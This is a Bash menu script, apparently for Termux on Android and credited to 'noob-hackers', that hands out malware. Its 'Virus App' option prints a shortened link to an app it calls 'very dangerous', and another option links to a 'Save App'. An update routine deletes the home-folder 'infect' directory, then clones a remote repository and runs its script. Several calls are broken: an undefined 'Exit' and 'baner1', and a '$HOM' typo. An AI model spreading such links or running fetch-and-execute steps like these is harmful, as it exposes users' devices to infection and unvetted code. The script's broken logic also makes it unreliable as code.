#  CODER BY M4CK3R (BHA)
# Colours
#-----------------
red="\e[91m"
rset="\e[0m"
grn="\e[92m"
ylo="\e[93m"
blue="\e[94m"
cyan="\e[96m"
pink="\e[95m"
#-----------------
# scripting start
banner(){
vid
echo " " 
echo -e "$red                       ▶Coder by$grn MKK$red◀$rset"
#Functions
echo -e "$red                        [Vrius App]$rset"
echo " "
echo " "
}
menu(){
echo -e "$grn             ＞＞＞＞>>>＞$ylo [Options]$grn ＜<<<＜＜＜＜$rset"
echo " "
echo " "
echo -e "$blue                        ✔️$cyan [\e[92m1\e[96m] Virus App"
echo -e "$blue                        ✔️$cyan [\e[92m2\e[96m] Save App"
echo -e "$blue                        ✔️$cyan [\e[92m8\e[96m] Exit"
echo " "
echo " "
echo -e "$grn               >＞＞＞＞＞$ylo [SELECT]$grn ＜＜＜＜＜<$rset"
echo " "
echo -ne "\e[92m#SELECT OPTION\e[92m: "
read optnz
if [ $optnz = "1" ];
then
virus
elif [ $optnz = "2" ];
then
save
elif [ $optnz = "3" ];
then
Exit
banner
menu
elif [ $optnz = "8" ];
then
exit 1
else
echo "wrong"
exit
fi
}
virus(){
################
clear
echo
echo -e "\e[91m Virus App Link.
                               

         \e[92mL1NK :- \e[96mhttps://bit.ly/3ild93L\e[91m

                                 
This App is very dangerous."
echo
echo -ne "\e[92m#Type exit : "
read exitz
if [ $exitz = "exit" ];
then
banner
menu
else
banner
menu
fi
}
save(){
clear
echo
echo " "
echo -e "\e[93m  Save App Link.
                    

        \e[92mL1NK :- \e[96mhttps://bit.ly/3fX8ljZ\e[93m

                    
This is Virus Save App."
echo
echo -ne "\e[92m#Type exit : "
read exitz
if [ $exitz = "exit" ];
then
banner
menu
else
banner
menu
fi
}
about(){
clear
echo -e '\e[91m
         ──▐─▌──▐─▌──
         ─▐▌─▐▌▐▌─▐▌─
         ─█▄▀▄██▄▀▄█─
         ──▄──██▌─▄──
         ▄▀─█▀██▀█─▀▄
         ▐▌▐▌─▐▌─▐▌▐▌
         ─▐─█────█─▌─
         ────▌──▐────
'
echo -e "\e[93m                  CALL ME \e[92mNITRO" | pv -qL 10
echo -e "\e[93m             IAM FROM \e[92mNOOB HACKERS" | pv -qL 10
echo -e "\e[93m       IM A \e[92mGEEK\e[93m WITH LOTS OF EXCITEMENT" | pv -qL 10
echo -e "\e[93m             HOPE YOU LIKE THIS SCRIPT" | pv -qL 10
echo -e "\e[93m         OOPS... I TALK A LOT SRY FOR THAT " | pv -qL 10
echo -e "\e[93m              JOIN GROUPS ON \e[92mWHATS' APP" | pv -qL 10
echo -e "\e[93m        MY WEBSITE:\e[92m www.noob-hackers.com\e[0m" | pv -qL 10
echo -e "\e[92m                BYEE.............." | pv -qL 10
sleep 6.0
banner
menu
}
upd(){
if [ -d "$HOME/infect" ];
then
cd $HOME
rm -rf infect
elif [ -d "$HOME/Infect" ];
then
cd $HOME
rm -rf Infect
else
echo
exit 1
fi
cd $HOME
sleep 1
echo -e "         \e[96mUPDATE IS GOING ON, PLEASE WAIT FOR A WHILE...!\e[0m"
echo
printf "                     \e[96m["
# While process is running...
while git clone https://github.com/noob-hackers/infect 2> /dev/null; do 
    printf  "\e[92m▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m"
    sleep 1
done
printf "\e[96m]\e[0m"
echo
echo
echo
printf "\e[96m           UPDATE SUCCESSFULL (LATEST VERSION)..!\e[0m"
sleep 2.0
cd $HOME
cd infect
bash infect.sh
}
vid(){
FILE=$HOME/infect/noob.noob
if [ -f "$FILE" ]; then
pop
else
echo
fi
}
pop(){
clear
echo -e "\e[96m                ╔═══════════════════════════════════╗\e[0m"
echo -e "\e[96m                ║  \e[93mHAI, I JUST UPLOADED NEW\e[96m VIDEO   ║\e[0m"
echo -e "\e[96m                ║      WATCH NEW VIDEO NOW.....!    ║\e[0m"
echo -e "\e[96m                ║                                   ║\e[0m"
echo -e "\e[96m                ║        Select \e[92my\e[96m to watch\e[96m          ║\e[0m"
echo -e "\e[96m                ║                (\e[93mOR\e[96m)               \e[96m║\e[0m"
echo -e "\e[96m                ║        Select \e[91mt\e[96m to cancel\e[96m         ║\e[0m"
echo -e "\e[96m                ║                (\e[93mOR\e[96m)               \e[96m║\e[0m"
echo -e "\e[96m                ║     Select \e[91mz\e[96m to skipforever\e[96m       ║\e[0m"
echo -e "\e[96m                ╚═══════════════════════════════════╝\e[0m"
echo -en "\e[32mSELECT OPTION [\e[93my/\e[93mt/\e[32m\e[93mz\e[32m]: \e[0m "
read p
if [ "$p" = "y" ];
then
am start -a android.intent.action.VIEW -d https://noobhacktube.com 2>/dev/null
clear
baner1
menu
elif [ "$p" = "t" ];
then
clear
baner1
menu
elif [ "$p" = "z" ];
then
cd $HOM/infect
rm noob.noob
banner
menu
else
banner
menu
exit
fi
}
banner
menu
